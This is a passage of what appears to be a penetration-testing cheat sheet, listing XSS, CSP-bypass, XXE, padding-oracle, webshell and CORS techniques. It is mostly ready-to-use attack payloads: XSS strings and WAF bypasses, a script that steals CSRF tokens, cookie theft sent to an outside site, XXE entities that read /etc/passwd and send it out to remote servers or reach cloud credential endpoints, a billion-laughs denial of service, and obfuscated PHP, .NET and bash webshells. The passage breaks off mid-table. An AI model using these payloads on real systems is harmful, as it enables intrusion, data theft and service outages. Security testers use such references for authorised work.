GIF89a/*&lt;svg/onload=alert(1)&gt;*/=alert(document.domain)//;
# If image can't load:
url.com/test.php?p=&lt;script src=http://url.com/upload/img/xss.gif&gt;

# XSS in png:
https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/

# XSS in PDF:
https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html?m=1

# XSS upload filename:
cp somefile.txt \"\&gt;\&lt;img\ src\ onerror=prompt\(1\)\&gt;
&lt;img src=x onerror=alert('XSS')&gt;.png
"&gt;&lt;img src=x onerror=alert('XSS')&gt;.png
"&gt;&lt;svg onmouseover=alert(1)&gt;.svg
&lt;&lt;script&gt;alert('xss')&lt;!--a--&gt;a.png
"&gt;&lt;svg onload=alert(1)&gt;.gif

# XSS Svg Image upload
&lt;svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"&gt;
   &lt;polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/&gt;
   &lt;script type="text/javascript"&gt;
      alert('XSS!');
   &lt;/script&gt;
&lt;/svg&gt;

# XSS svg image upload 2
# If you're testing a text editor on a system that you can also upload files to, try to oembed an svg:
&lt;iframe src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/movingcart_1.svg" frameborder="0"&gt;&lt;/iframe&gt;
#If that works, upload an SVG with the following content and try rendering it using the text editor:
&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;
    &lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;/svg&gt;

# XSS in SVG 3:
&lt;svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/&gt;

# XSS in XML
&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
&lt;something:script xmlns:something="http://www.w3.org/1999/xhtml"&gt;alert(1)&lt;/something:script&gt;
&lt;/body&gt;
&lt;/html&gt;

# https://brutelogic.com.br/blog/file-upload-xss/

" ="" '&gt;&lt;/&gt;&lt;script&gt;&lt;/script&gt;&lt;svg onload"="alertonload=alert(1)"" onload=setInterval'alert\x28document.domain\x29'

# XSS in existent jpeg:
exiftool -Artist='"&gt;&lt;svg onload=alert(1)&gt;' xss.jpeg

# XSS in url (and put as header)
http://acme.corp/?redir=[URI_SCHEME]://gremwell.com%0A%0A[XSS_PAYLOAD]

# XSS in XML
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;html xmlns:html="http://w3.org/1999/xhtml"&gt;
&lt;html:script&gt;prompt(document.domain);&lt;/html:script&gt;
&lt;/html&gt;
</code></pre>
<h2 id="dom-xss"><a class="header" href="#dom-xss"><strong>DOM XSS</strong></a></h2>
<pre><code class="language-markup">&lt;img src=1 onerror=alert(1)&gt;
&lt;iframe src=javascript:alert(1)&gt;
&lt;details open ontoggle=alert(1)&gt;
&lt;svg&gt;&lt;svg onload=alert(1)&gt;
data:text/html,&lt;img src=1 onerror=alert(1)&gt;
data:text/html,&lt;iframe src=javascript:alert(1)&gt;
&lt;iframe src=TARGET_URL onload="frames[0].postMessage('INJECTION','*')"&gt;
"&gt;&lt;svg onload=alert(1)&gt;
javascript:alert(document.cookie)
\"-alert(1)}//
</code></pre>
<h2 id="xss-to-csrf"><a class="header" href="#xss-to-csrf"><strong>XSS to CSRF</strong></a></h2>
<pre><code class="language-markup"># Example:

# Detect action to change email, with anti csrf token, get it and paste this in a comment to change user email:

&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&amp;email=test@test.com')
};
&lt;/script&gt;
</code></pre>
<h2 id="angularjs-sandbox"><a class="header" href="#angularjs-sandbox"><strong>AngularJS Sandbox</strong></a></h2>
<pre><code class="language-markup"># Removed in AngularJS 1.6
# Is a way to avoid some strings like window, document or __proto__.

# Without strings:
/?search=1&amp;toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

# With CSP:

&lt;script&gt;
location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
&lt;/script&gt;

# v 1.6 and up
{{$new.constructor('alert(1)')()}}
&lt;x ng-app&gt;{{$new.constructor('alert(1)')()}}

{{constructor.constructor('alert(1)')()}}
{{constructor.constructor('import("https://six2dez.xss.ht")')()}}
{{$on.constructor('alert(1)')()}}
{{{}.")));alert(1)//"}}
{{{}.")));alert(1)//"}}
toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
</code></pre>
<h2 id="xss-in-js"><a class="header" href="#xss-in-js"><strong>XSS in JS</strong></a></h2>
<pre><code class="language-markup"># Inside JS script:
&lt;/script&gt;&lt;img src=1 onerror=alert(document.domain)&gt;
&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;

# Inside JS literal script:
'-alert(document.domain)-'
';alert(document.domain)//
'-alert(1)-'

# Inside JS that escape special chars:
If ';alert(document.domain)// is converted in \';alert(document.domain)//
Use \';alert(document.domain)// to obtain \\';alert(document.domain)//
\'-alert(1)//

# Inside JS with some char blocked:
onerror=alert;throw 1
/post?postId=5&amp;%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27

# Inside {}
${alert(document.domain)}
${alert(1)}
</code></pre>
<h2 id="xss-waf-bypasses"><a class="header" href="#xss-waf-bypasses">XSS Waf Bypasses</a></h2>
<pre><code class="language-markup"># Only lowercase block
&lt;sCRipT&gt;alert(1)&lt;/sCRipT&gt;

# Break regex
&lt;script&gt;%0aalert(1)&lt;/script&gt;

# Double encoding
%2522

# Recursive filters
&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;

# Inject anchor tag
&lt;a/href="j&amp;Tab;a&amp;Tab;v&amp;Tab;asc&amp;Tab;ri&amp;Tab;pt:alert&amp;lpar;1&amp;rpar;"&gt;

# Bypass whitespaces
&lt;svg·onload=alert(1)&gt;

# Change GET to POST request

# Imperva Incapsula
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
&lt;img/src="x"/onerror="[JS-F**K Payload]"&gt;
&lt;iframe/onload='this["src"]="javas&amp;Tab;cript:al"+"ert``"';&gt;&lt;img/src=q onerror='new Function`al\ert\`1\``'&gt;

# WebKnight
&lt;details ontoggle=alert(1)&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="alert(1)"&gt;

# F5 Big IP
&lt;body style="height:1000px" onwheel="[DATA]"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="[DATA]"&gt;
&lt;body style="height:1000px" onwheel="[JS-F**k Payload]"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="[JS-F**k Payload]"&gt;
&lt;body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)"&gt;

# Barracuda WAF
&lt;body style="height:1000px" onwheel="alert(1)"&gt;
&lt;div contextmenu="xss"&gt;Right-Click Here&lt;menu id="xss" onshow="alert(1)"&gt;

# PHP-IDS
&lt;svg+onload=+"[DATA]"
&lt;svg+onload=+"aler%25%37%34(1)"

# Mod-Security
&lt;a href="j[785 bytes of (&amp;NewLine;&amp;Tab;)]avascript:alert(1);"&gt;XSS&lt;/a&gt;
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
&lt;b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)&gt;

# Quick Defense:
&lt;input type="search" onsearch="aler\u0074(1)"&gt;
&lt;details ontoggle="aler\u0074(1)"&gt;

# Sucuri WAF
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4

# Akamai
1%3C/script%3E%3Csvg/onload=prompt(document[domain])%3E
&lt;SCr%00Ipt&gt;confirm(1)&lt;/scR%00ipt&gt;
# AngularJS
{{constructor.constructor(alert 1 )()}} 
</code></pre>
<h2 id="xss-mindmap"><a class="header" href="#xss-mindmap">XSS Mindmap</a></h2>
<p><img src="enumeration/web/../../.gitbook/assets/XSS2.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csp"><a class="header" href="#csp">CSP</a></h1>
<pre><code class="language-markup"># CSP Checker
https://csp-evaluator.withgoogle.com/

# Content-Security-Policy Header

- If upload from web is allowed or &lt;img src="URL"&gt;:
https://medium.com/@shahjerry33/pixel-that-steals-data-im-invisible-3c938d4c3888
https://iplogger.org/invisible/
https://iplogger.org/15bZ87

- Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-inline' https://*; child-src 'none'; report-uri /Report-parsing-url;
By observing this policy we can say it's damn vulnerable and will allow inline scripting as well . The reason behind that is the usage of unsafe-inline source as a value of script-src directive.
working payload : "/&gt;&lt;script&gt;alert(1337);&lt;/script&gt;

- Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-eval' data: http://*; child-src 'none'; report-uri /Report-parsing-url;
Again this is a misconfigured CSP policy due to usage of unsafe-eval.
working payload : &lt;script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="&gt;&lt;/script&gt;

- Content-Security-Policy: script-src 'self' https://facebook.com https://google.com https: data *; child-src 'none'; report-uri /Report-parsing-url;
Again this is a misconfigured CSP policy due to usage of a wildcard in script-src.
working payloads :"/&gt;'&gt;&lt;script src=https://attacker.com/evil.js&gt;&lt;/script&gt;"/&gt;'&gt;&lt;script src=data:text/javascript,alert(1337)&gt;&lt;/script&gt;

- Content-Security-Policy: script-src 'self' report-uri /Report-parsing-url;
Misconfigured CSP policy again! we can see object-src and default-src are missing here.
working payloads :&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;&lt;/object&gt;"&gt;'&gt;&lt;object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'&gt;
&lt;param name="AllowScriptAccess" value="always"&gt;&lt;/object&gt;

- Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval' ajax.googleapis.com;
With unsafe-eval policy enabled we can perform a Client-Side Template Injection attack.
&lt;script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"&gt;&lt;/script&gt; &lt;div ng-app&gt; {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} &lt;/div&gt;
&lt;script src=https://drive.google.com/uc?id=...&amp;export=download&gt;&lt;/script&gt;

- Content-Security-Policy: default-src 'self'; script-src 'self'  *.googleusercontent.com *.google.com *.yandex.net;
You can upload the payload to the Yandex.Disk storage, copy the download link and replace the content_type parameter value in the link with application/javascript
&lt;script src="https://[***].storage.yandex.net/[...]content_type=application/javascript&amp;[***]"&gt;&lt;/script&gt;

- Content-Security-Policy: default-src 'self'
If you are not allowed to connect to any external host, you can send data directly in the URL (query string) by redirecting the user to your web server
window.location='https://deteact.com/'+document.cookie;

- Content-Security-Policy: script-src 'self'; object-src 'none' ; report-uri /Report-parsing-url;
We  can see object-src is set to none but yes this CSP can be bypassed too  to perform XSS. How ? If the application allows users to upload any type  of file to the host. An attacker can upload any malicious script and  call within any tag.
working payloads :"/&gt;'&gt;&lt;script src="/user_upload/mypic.png.js"&gt;&lt;/script&gt;

- Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none' ; report-uri /Report-parsing-url;
In such scenarios where script-src is set to self and a particular domain which is whitelisted, it can be bypassed using jsonp. jsonp endpoints allow insecure callback methods which allow an attacker to perform xss.
working payload :"&gt;&lt;script src="https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert#1"&gt;&lt;/script&gt;

- Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/; object-src 'none' ; report-uri /Report-parsing-url;
In  such scenarios where script-src is set to self and a javascript library  domain which is whitelisted. It can be bypassed using any vulnerable  version of javascript file from that library , which allows the attacker  to perform xss.
working payloads :&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"&gt;&lt;/script&gt;

&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /&gt;&lt;/script&gt;
 &lt;div ng-app ng-csp&gt;
  {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d =&gt; {})") }}
 &lt;/div&gt;"&gt;&lt;script src="https://cdnjs.cloudflare.com/angular.min.js"&gt;&lt;/script&gt; &lt;div ng-app ng-csp&gt;{{$eval.constructor('alert(1)')()}}&lt;/div&gt;"&gt;&lt;script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"&gt; &lt;/script&gt;
&lt;div ng-app ng-csp id=p ng-click=$event.view.alert(1337)&gt;

- Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
If  the application is using angular JS and scripts are loaded from a  whitelisted domain. It is possible to bypass this CSP policy by calling  callback functions and vulnerable class. For more details visit this  awesome git repo.
working payloads :ng-app"ng-csp ng-click=$event.view.alert(1337)&gt;&lt;script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js&gt;&lt;/script&gt;"&gt;&lt;script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337&gt;&lt;/script&gt;

- Content-Security-Policy: script-src 'self' accounts.google.com/random/ website.with.redirect.com ; object-src 'none' ; report-uri /Report-parsing-url;
In  the above scenario, there are two whitelisted domains from where  scripts can be loaded to the webpage. Now if one domain has any open  redirect endpoint CSP can be bypassed easily. The reason behind that is  an attacker can craft a payload using redirect domain targeting to other  whitelisted domains having a jsonp endpoint. And in this scenario XSS  will execute because while redirection browser only validated host, not  the path parameters.
working payload :"&gt;'&gt;&lt;script src="https://website.with.redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"&gt;&lt;/script&gt;"&gt;

- Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' www.googletagmanager.com;
With inline execution enabled we can simply injection our code into the page.
url.com/asd.php/?a=&lt;script&gt;alert(document.domain)&lt;/scrtipt&gt;
GoogleTagManager
&lt;script&gt;setTimeout(function(){dataLayer.push({event:'gtm.js'})},1000)&lt;/script&gt;
&lt;script src="//www.googletagmanager.com/gtm.js?id=GTM-*******"&gt;&lt;/script&gt;

- Content-Security-Policy: default-src 'self' data: *; connect-src 'self'; script-src  'self' ;report-uri /_csp; upgrade-insecure-requests
This CSP policy can be bypassed using iframes. The condition is that  application should allow iframes from the whitelisted domain. Now using a  special attribute srcdoc of iframe, XSS can be easily achieved.
working payloads :&lt;iframe srcdoc='&lt;script src="data:text/javascript,alert(document.domain)"&gt;&lt;/script&gt;'&gt;&lt;/iframe&gt;* sometimes it can be achieved using defer&amp; async attributes of script within iframe (most of the time in new browser due to SOP it fails but who knows when you are lucky?)&lt;iframe src='data:text/html,&lt;script defer="true" src="data:text/javascript,document.body.innerText=/hello/"&gt;&lt;/script&gt;'&gt;&lt;/iframe&gt;

- CSP with policy injection (only Chrome)
/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="xxe"><a class="header" href="#xxe">XXE</a></h1>
<h2 id="summary-1"><a class="header" href="#summary-1">Summary</a></h2>
<p>XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.</p>
<p>Detection:</p>
<pre><code class="language-markup"># Content type "application/json" or "application/x-www-form-urlencoded" to "applcation/xml".
# File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files.
# If svg allowed in picture upload, you can inject xml in svgs.
# If the web app offers RSS feeds, add your milicious code into the RSS.
# Fuzz for /soap api, some applications still running soap apis
# If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse
</code></pre>
<p>Check:</p>
<pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE a [&lt;!ENTITY test "THIS IS A STRING!"&gt;]&gt;
&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;
</code></pre>
<p>If works, then:</p>
<pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE a[&lt;!ENTITY test SYSTEM "file:///etc/passwd"&gt;]&gt;
&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;
</code></pre>
<h2 id="tools-7"><a class="header" href="#tools-7">Tools</a></h2>
<pre><code class="language-markup"># https://github.com/BuffaloWill/oxml_xxe
# https://github.com/enjoiz/XXEinjector
</code></pre>
<h2 id="attacks"><a class="header" href="#attacks">Attacks</a></h2>
<pre><code class="language-markup"># Get PHP file:
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE a [&lt;!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;
&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;

# Classic XXE Base64 encoded
&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"&gt; %init; ]&gt;&lt;foo/&gt;

# Check if entities are enabled
&lt;!DOCTYPE replace [&lt;!ENTITY test "pentest"&gt; ]&gt;
 &lt;root&gt;
  &lt;xxe&gt;&amp;test;&lt;/xxe&gt;
 &lt;/root&gt;

# XXE LFI:
&lt;!DOCTYPE foo [  
&lt;!ELEMENT foo (#ANY)&gt;
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;

# XXE Blind LFI:
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo (#ANY)&gt;
&lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY blind SYSTEM "https://www.example.com/?%xxe;"&gt;]&gt;&lt;foo&gt;&amp;blind;&lt;/foo&gt;

# XXE Access control bypass
&lt;!DOCTYPE foo [
&lt;!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php"&gt;]&gt;
&lt;foo&gt;&lt;result&gt;&amp;ac;&lt;/result&gt;&lt;/foo&gt;

# XXE to SSRF:
&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"&gt; ]&gt;

# XXE OOB
&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE data [ 
 &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
 &lt;!ENTITY % dtd SYSTEM "http://your.host/remote.dtd"&gt; 
%dtd;]&gt;
&lt;data&gt;&amp;send;&lt;/data&gt;

# PHP Wrapper inside XXE
&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt; ]&gt;
&lt;contacts&gt;
  &lt;contact&gt;
    &lt;name&gt;Jean &amp;xxe; Dupont&lt;/name&gt;
    &lt;phone&gt;00 11 22 33 44&lt;/phone&gt;
    &lt;adress&gt;42 rue du CTF&lt;/adress&gt;
    &lt;zipcode&gt;75000&lt;/zipcode&gt;
    &lt;city&gt;Paris&lt;/city&gt;
  &lt;/contact&gt;
&lt;/contacts&gt;

&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [
&lt;!ELEMENT foo ANY &gt;
&lt;!ENTITY % xxe SYSTEM "php://filter/convert.bae64-encode/resource=http://10.0.0.3" &gt;
]&gt;
&lt;foo&gt;&amp;xxe;&lt;/foo&gt;

# Deny Of Service - Billion Laugh Attack

&lt;!DOCTYPE data [
&lt;!ENTITY a0 "dos" &gt;
&lt;!ENTITY a1 "&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"&gt;
&lt;!ENTITY a2 "&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"&gt;
&lt;!ENTITY a3 "&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;"&gt;
&lt;!ENTITY a4 "&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;"&gt;
]&gt;
&lt;data&gt;&amp;a4;&lt;/data&gt;

# Yaml attack

a: &amp;a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &amp;b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &amp;c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &amp;d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &amp;e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &amp;f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &amp;g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &amp;h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &amp;i [*h,*h,*h,*h,*h,*h,*h,*h,*h]

# XXE OOB Attack (Yunusov, 2013)

&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd"&gt;
&lt;data&gt;&amp;send;&lt;/data&gt;

File stored on http://publicServer.com/parameterEntity_oob.dtd
&lt;!ENTITY % file SYSTEM "file:///sys/power/image_size"&gt;
&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://publicServer.com/?%file;'&gt;"&gt;
%all;

# XXE OOB with DTD and PHP filter

&lt;?xml version="1.0" ?&gt;
&lt;!DOCTYPE r [
&lt;!ELEMENT r ANY &gt;
&lt;!ENTITY % sp SYSTEM "http://92.222.81.2/dtd.xml"&gt;
%sp;
%param1;
]&gt;
&lt;r&gt;&amp;exfil;&lt;/r&gt;

File stored on http://92.222.81.2/dtd.xml
&lt;!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;
&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'http://92.222.81.2/dtd.xml?%data;'&gt;"&gt;

# XXE Inside SOAP

&lt;soap:Body&gt;&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;&lt;/foo&gt;&lt;/soap:Body&gt;

# XXE PoC

&lt;!DOCTYPE xxe_test [ &lt;!ENTITY xxe_test SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;x&gt;&amp;xxe_test;&lt;/x&gt;
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE xxe_test [ &lt;!ENTITY xxe_test SYSTEM "file:///etc/passwd"&gt; ]&gt;&lt;x&gt;&amp;xxe_test;&lt;/x&gt;
&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;&lt;!DOCTYPE xxe_test [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe_test SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe_test;&lt;/foo&gt;

# XXE file upload SVG
&lt;svg&gt;&amp;xxe;&lt;/svg&gt;
&lt;svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"&gt;
    &lt;image xlink:href="expect://ls"&gt;&lt;/image&gt;
&lt;/svg&gt;

&lt;?xml version="1.0" encdoing="UTF-8" standalone="yes"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt; ]&gt;&lt;svg width="512px" height="512px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;&lt;text font-size="14" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;  

# XXE Hidden Attack

- Xinclude

Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
Set the value of the productId parameter to:
&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;

- File uploads:

Create a local SVG image with the following content:
&lt;?xml version="1.0" standalone="yes"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt; ]&gt;&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;&lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;
Post a comment on a blog post, and upload this image as an avatar.
When you view your comment, you should see the contents of the /etc/hostname file in your image. Then use the "Submit solution" but
</code></pre>
<h2 id="mindmap-1"><a class="header" href="#mindmap-1">Mindmap</a></h2>
<p><img src="enumeration/web/../../.gitbook/assets/image%20(26).png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cookie-padding"><a class="header" href="#cookie-padding">Cookie Padding</a></h1>
<pre><code class="language-bash"># https://github.com/AonCyberLabs/PadBuster
# Get cookie structure
padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding"
# Get cookie for other user (impersonation)
padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding" -plaintext 'user=administratorhc0nwithyhackme'

#https://github.com/glebarez/padre
padre -u 'https://target.site/profile.php' -cookie 'SESS=$' 'Gw3kg8e3ej4ai9wffn%2Fd0uRqKzyaPfM2UFq%2F8dWmoW4wnyKZhx07Bg=='

# https://github.com/Kibouo/rustpad

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="webshells"><a class="header" href="#webshells">Webshells</a></h1>
<p>https://www.localroot.net/</p>
<h2 id="php"><a class="header" href="#php"><strong>PHP</strong></a></h2>
<pre><code class="language-php"># system

//CURL http://ip/shell.php?1=whoami
//www.somewebsite.com/index.html?1=ipconfig

// passthru 
&lt;?php passthru($_GET['cmd']); ?&gt;

// NINJA
;").($_^"/"); ?&gt; 
http://target.com/path/to/shell.php?=function&amp;=argument
http://target.com/path/to/shell.php?=system&amp;=ls

// NINJA 2
/'^'{{{{';@${$_}[_](@${$_}[__]);

// One more
&lt;?=$_="";$_="'";$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=${$_}['_'^'o'];echo`$_`?&gt;

// https://github.com/Arrexel/phpbash
// https://github.com/flozz/p0wny-shell
</code></pre>
<h2 id="net"><a class="header" href="#net"><strong>.NET</strong></a></h2>
<pre><code class="language-aspnet">&lt;%@Page Language=”C#”%&gt;&lt;%var p=new System.Diagnostics.Process{StartInfo={FileName=Request[“c”],UseShellExecute=false,RedirectStandardOutput=true}};p.Start();%&gt;&lt;%=p.StandardOutput.ReadToEnd()%&gt;
www.somewebsite.com/cgi-bin/a?ls%20/var
</code></pre>
<h2 id="bash"><a class="header" href="#bash"><strong>Bash</strong></a></h2>
<pre><code class="language-bash">#!/bin/sh
echo;$_ `${QUERY_STRING/%20/ }`
www.somewebsite.com/cgi-bin/a?ls%20/var
</code></pre>
<h2 id="aspx"><a class="header" href="#aspx">aspx</a></h2>
<pre><code class="language-bash"># https://github.com/antonioCoco/SharPyShell
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cors"><a class="header" href="#cors">CORS</a></h1>
<h2 id="tools-8"><a class="header" href="#tools-8">Tools</a></h2>
<pre><code class="language-bash"># https://github.com/s0md3v/Corsy
python3 corsy.py -u https://example.com
# https://github.com/chenjj/CORScanner
python cors_scan.py -u example.com
# https://github.com/Shivangx01b/CorsMe
echo "https://example.com" | ./Corsme 
cat subdomains.txt | ./httprobe -c 70 -p 80,443,8080,8081,8089 | tee http_https.txt
cat http_https.txt | ./CorsMe -t 70
# CORSPoc
# https://tools.honoki.net/cors.html
</code></pre>
<div class="table-wrapper"><table><thead><tr><th style="text-align: left">URL accessed</th><th style="text-align: left">Access permitted?</th></tr></thead><tbody>
<tr><td style="text-align: left">http://normal-website.com/example/</td><td style="text-align: left">Yes: same scheme, domain, and port</td></tr>
<tr><td style="text-align: left">http://normal-website.com/example2/</td><td style="text-align: left">Yes: same scheme, domain, and port</td></tr>
<tr><td style="text-align: left">https://normal-website.com/example/</td><td style="text-align: left">No: different scheme and port</td></tr>
<tr><td style="text-align: left">http://en.normal-website.com/example/</td><td style="text-align: left">No: different domain</td></tr>
<tr><td style="text-align: left">http://www.normal-website.com/example/</td><td style="text-align: left">No: different domain</td></tr>
